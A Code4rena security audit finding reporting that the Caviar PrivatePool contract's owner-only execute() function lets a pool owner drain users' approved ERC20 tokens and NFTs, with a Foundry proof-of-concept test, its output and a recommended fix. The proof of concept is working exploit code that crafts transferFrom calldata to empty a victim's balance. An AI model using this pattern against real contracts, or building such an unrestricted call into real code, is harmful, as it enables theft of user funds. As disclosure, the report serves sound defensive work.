## Tags

- bug
- 3 (High Risk)
- high quality report
- primary issue
- selected for report
- sponsor confirmed
- H-02

# [PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution](https://github.com/code-423n4/2023-04-caviar-findings/issues/184) 

# Lines of code

https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L459


# Vulnerability details

## Impact

PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution.

## Proof of Concept

In the current implementation of the PrivatePool.sol, the function execute is meant to claim airdrop, however, we cannot assume the owner is trusted because anyone can permissionlessly create private pool.

```solidity
/// @notice Executes a transaction from the pool account to a target contract. The caller must be the owner of the
/// pool. This allows for use cases such as claiming airdrops.
/// @param target The address of the target contract.
/// @param data The data to send to the target contract.
/// @return returnData The return data of the transaction.
function execute(address target, bytes memory data) public payable onlyOwner returns (bytes memory) {
	// call the target with the value and data
	(bool success, bytes memory returnData) = target.call{value: msg.value}(data);

	// if the call succeeded return the return data
	if (success) return returnData;

	// if we got an error bubble up the error message
	if (returnData.length > 0) {
		// solhint-disable-next-line no-inline-assembly
		assembly {
			let returnData_size := mload(returnData)
			revert(add(32, returnData), returnData_size)
		}
	} else {
		revert();
	}
}
```

the owner of private pool can easily steal all ERC20 token and NFT from the user's wallet after user give approval to the PrivatePool contract and the user has to give the approval to the pool to let the PrivatePool pull ERC20 token and NFT from the user when user buy or sell or change from EthRouter or directly calling PrivatePool,

the POC below shows, the owner of the PrivatePool can carefully crafting payload to steal fund via arbitrary execution.

after user's apporval, the target can be a ERC20 token address or a NFT address, the call data can be the payload of transferFrom or function.

Please add the code to Execute.t.sol so we can create a mock token

```solidity
contract MyToken is ERC20 {
    constructor() ERC20("MyToken", "MTK", 18) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
```

Please add the POC below to Execute.t.sol

```solidity
  function testStealFundArbitrary_POC() public {
        MyToken token = new MyToken();

        address victim = vm.addr(1040341830);
        address hacker = vm.addr(14141231201);

        token.mint(victim, 100000 ether);

        vm.prank(victim);
        token.approve(address(privatePool), type(uint256).max);

        console.log(
            "token balance of victim before hack",
            token.balanceOf(victim)
        );

        address target = address(token);
        bytes memory data = abi.encodeWithSelector(
            ERC20.transferFrom.selector,
            victim,
            hacker,
            token.balanceOf(victim)
        );

        privatePool.execute(target, data);

        console.log(
            "token balance of victim  after hack",
            token.balanceOf(victim)
        );
    }
```

We run the POC, the output is

```solidity
PS D:\2023Security\2023-04-caviar> forge test -vv --match "testStealFundArbitrary_POC"
[⠒] Compiling...
[⠑] Compiling 1 files with 0.8.19
[⠃] Solc 0.8.19 finished in 8.09s
Compiler run successful

Running 1 test for test/PrivatePool/Execute.t.sol:ExecuteTest
[PASS] testStealFundArbitrary_POC() (gas: 753699)
Logs:
  token balance of victim before hack 100000000000000000000000
  token balance of victim  after hack 0
```

As we can see, the victim's ERC20 token are stolen.

## Tools Used

Manual Review

## Recommended Mitigation Steps

We recommend the protocol not let the private pool owner perform arbtirary execution, the private pool can use the flashloan to claim the airdrop himself.

